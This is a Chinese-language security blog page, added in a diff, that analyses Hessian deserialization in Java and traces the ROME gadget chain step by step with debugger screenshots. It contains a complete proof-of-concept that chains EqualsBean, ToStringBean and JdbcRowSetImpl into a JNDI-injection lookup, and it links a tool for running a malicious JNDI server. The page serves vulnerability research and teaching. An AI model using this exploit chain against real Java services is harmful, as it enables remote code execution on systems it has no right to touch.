@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Hessian反序列化 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Hessian\u53cd\u5e8f\u5217\u5316", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u673a\u5236", url: "#_2" },
+              {title: "Hessian\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316Demo", url: "#hessiandemo" },
+              {title: "Gadget\u2014\u2014ROME", url: "#gadgetrome" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/" class="btn btn-xs btn-link">
+        JAVA反序列化攻击的回显
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Hessian/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Hessian/" class="btn btn-xs btn-link">
+        Hessian
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="hessian">Hessian反序列化</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#序列化反序列化机制">序列化/反序列化机制</a><ul>
+<li><a href="#基于Bean">基于Bean</a></li>
+<li><a href="#基于field">基于field</a></li>
+</ul>
+</li>
+<li><a href="#Hessian序列化反序列化Demo">Hessian序列化/反序列化Demo</a></li>
+<li><a href="#GadgetROME">Gadget——ROME</a><ul>
+<li><a href="#步骤1">步骤1</a></li>
+<li><a href="#步骤2">步骤2</a></li>
+<li><a href="#步骤3">步骤3</a></li>
+</ul>
+</li>
+</ul>
+<p>Hessian反序列化和jdk原生的反序列化不同，其衍生的Gadget也不同。</p>
+<h2 id="_2">序列化/反序列化机制</h2>
+<p>java中的序列化/反序列化大体上分为两类</p>
+<h3 id="bean">基于Bean</h3>
+<p>常见的攻击对象有&#x20;</p>
+<ul>
+<li>fastjson</li>
+<li>jackson</li>
+<li>Java XMLDecoder</li>
+<li>....</li>
+</ul>
+<p>其核心是在反序列化对象时，其调用getter、setter方法（如fastjson），或者默认构造方法，或者类对象里的其他方法。
+这种机制攻击面比基于field更大。</p>
+<h3 id="field">基于field</h3>
+<p>常见的攻击对象</p>
+<ul>
+<li>java原生序列化/反序列化</li>
+<li>Hessian</li>
+<li>...</li>
+</ul>
+<p>基于Field的方式，一般真正进行序列化/反序列化的核心方法是一个native方法，直接对Field进行赋值操作。</p>
+<h2 id="hessiandemo">Hessian序列化/反序列化Demo</h2>
+<p>maven依赖</p>
+<pre><code class="language-java">&lt;dependency&gt;
+      &lt;groupId&gt;com.caucho&lt;/groupId&gt;
+      &lt;artifactId&gt;hessian&lt;/artifactId&gt;
+      &lt;version&gt;4.0.38&lt;/version&gt;
+    &lt;/dependency&gt;
+</code></pre>
+<p>Hessian 比 原生JDK相比，序列化速度更慢，但反序列化所需时间和空间都更小</p>
+<pre><code class="language-java">Apple.java
+import java.io.Serializable;
+
+public class Apple implements Serializable {
+    public void color(){
+        System.out.println(&quot;yellow&quot;);
+    }
+
+    public void size(){
+        System.out.println(&quot;10g&quot;);
+    }
+}
+
+se.java
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+
+import com.caucho.hessian.io.HessianInput;
+import com.caucho.hessian.io.HessianOutput;
+
+public class se {
+    public static void main(String args[]) throws Exception{
+        Apple ap = new Apple();
+        ByteArrayOutputStream a = new ByteArrayOutputStream();
+        HessianOutput hi = new HessianOutput(a);
+        hi.writeObject(ap);
+
+        byte[] data= a.toByteArray();
+
+        ByteArrayInputStream b = new ByteArrayInputStream(data);
+        HessianInput ho = new HessianInput(b);
+        Apple apple =(Apple) ho.readObject();
+        apple.size();
+    }
+
+}
+
+</code></pre>
+<h2 id="gadgetrome">Gadget——ROME</h2>
+<p>在工具 marshalsec中支持如下Hessian Gadget，分析一下ROME链吧</p>
+<ul>
+<li>Rome</li>
+<li>XBean</li>
+<li>Resin</li>
+<li>SpringPartiallyComparableAdvisorHolder</li>
+<li>SpringAbstractBeanFactoryPointcutAdvisor</li>
+</ul>
+<p>需要以下依赖</p>
+<pre><code class="language-java">&lt;dependency&gt;
+    &lt;groupId&gt;com.rometools&lt;/groupId&gt;
+     &lt;artifactId&gt;rome&lt;/artifactId&gt;
+     &lt;version&gt;1.7.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>poc如下。我们跟着POC分析</p>
+<pre><code class="language-java">import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+import com.caucho.hessian.io.HessianInput;
+import com.caucho.hessian.io.HessianOutput;
+import com.rometools.rome.feed.impl.EqualsBean;
+import com.rometools.rome.feed.impl.ToStringBean;
+import com.sun.rowset.JdbcRowSetImpl;
+
+public class se {
+    public static void main(String args[]) throws Exception{
+//反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup
+        String jndiUrl = &quot;ldap://localhost:10099/Sim&quot;;
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
+        rs.setDataSourceName(jndiUrl);
+        rs.setMatchColumn(&quot;foo&quot;);
+
+//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString
+        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
+//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode-&gt;EqualsBean.beanHashCode
+        EqualsBean root = new EqualsBean(ToStringBean.class, item);
+
+//HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash
+        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();
+        setFieldValue(s, &quot;size&quot;, 2);
+        Class&lt;?&gt; nodeC;
+        try {
+            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);
+        }
+        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 1);
+        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
+        setFieldValue(s, &quot;table&quot;, tbl);
+
+        ByteArrayOutputStream a= new ByteArrayOutputStream();
+        HessianOutput ho = new HessianOutput(a);
+        ho.writeObject(s);
+
+        byte[] data= a.toByteArray();
+
+        ByteArrayInputStream b = new ByteArrayInputStream(data);
+        HessianInput hi = new HessianInput(b);
+        hi.readObject(); //触发点
+
+    }
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Field getField ( final Class&lt;?&gt; clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+}
+
+</code></pre>
+<p>我们在 hi.readObject()打下断点跟进看看原理。</p>
+<p>因为这个gadget最终是控制lookup参数完成jndi注入，所以对jdk版本也有所限制，这里选择的版本是 8u181配合ldap协议完成jndi注入
+并使用此项目一键启动jndi恶意服务端<a href="https://github.com/F4ded/EZ-JNDI" title="https://github.com/F4ded/EZ-JNDI">https://github.com/F4ded/EZ-JNDI</a></p>
+<p><img alt="" src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg" /></p>
+<p>从poc来看，过程无非就3步：</p>
+<ul>
+<li>HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash→EqualsBean.hashCode-&gt;EqualsBean.beanHashCode</li>
+<li>EqualsBean.beanHashCode被调用，触发ToStringBean.toString</li>
+<li>ToStringBean.toString()被调用，触发JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup</li>
+</ul>
+<h4 id="1">步骤1</h4>
+<p>最开始的步骤，就是从readObject到HashMap.hash</p>
+<p>我们跟进readObject方法，发现它会根据序列化对象的类型来选择不同的处理方法
+由于Hessian序列化时将结果处理成了Map，所以处理的第一个序列化对象总是map对象，这是Hessian反序列化一个特殊的机制。</p>
+<p><img alt="" src="../image/image_tFWXpdetxT.png" /></p>
+<p>当处理到我们自己定义的HashMap时（也就是poc中的s），它会按先后顺序反序列化key、value值，然后依次传入Hashmap.put方法进行处理</p>
+<p><img alt="" src="../image/image_jT_F_tkoNQ.png" /></p>
+<p>然后经由Hashmap.putVal处理</p>
+<p><img alt="" src="../image/image_pFqTRb0Vkr.png" /></p>
+<p><img alt="" src="../image/image_AzzZT8FuG_.png" /></p>
+<p>随后调用key的hashcode方法，由于key是EqualsBean，所以会调用EqualsBean.hashCode()，跟进后会发现调用EqualsBean.beanHashCode()</p>
+<p><img alt="" src="../image/image_N7aKpi6ugN.png" /></p>
+<p><img alt="" src="../image/image_U8rYnKh6VV.png" /></p>
+<p>发现会调用this.obj.toString()</p>
+<h4 id="2">步骤2</h4>
+<p>由于我们在poc向EqualsBean构造方法传入了ToStringBean对象item，所以this.obj就是一个ToStringBean对象</p>
+<p><img alt="" src="../image/image_fify6Ztg6t.png" /></p>
+<p>所以this.obj.toString() 即ToStringBean.toString</p>
+<p><img alt="" src="../image/image_PuEEYHyqaB.png" /></p>
+<p><img alt="" src="../image/image_O4O8j7vKOG.png" /></p>
+<p>跟进后可以发现它会遍历我们在ToStringBean里传入的类（poc里传入的是JdbcRowSetImpl）的所有属性和方法，然后无通过反射参调用所有方法。
+其中就会调用到JdbcRowSetImpl的无参方法：getDatabaseMetaData</p>
+<h4 id="3">步骤3</h4>
+<p>我们跟进getDatabaseMetaData</p>
+<p><img alt="" src="../image/image_Wx46-YU1V6.png" /></p>
+<p>发现会调用connect方法，继续跟进，发现jndi注入，lookup参数是可控的：我们在poc中构建JdbcRowSetImpl对象时通过setDataSourceName方法设置</p>
+<p><img alt="" src="../image/image_f0jORy6vCO.png" /></p>
+<p>继续跟，弹计算器了</p>
+<p><img alt="" src="../image/image_8ZEvG1vDGq.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/" class="btn btn-xs btn-link">
+        JAVA反序列化攻击的回显
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Hessian/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Hessian/" class="btn btn-xs btn-link">
+        Hessian
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
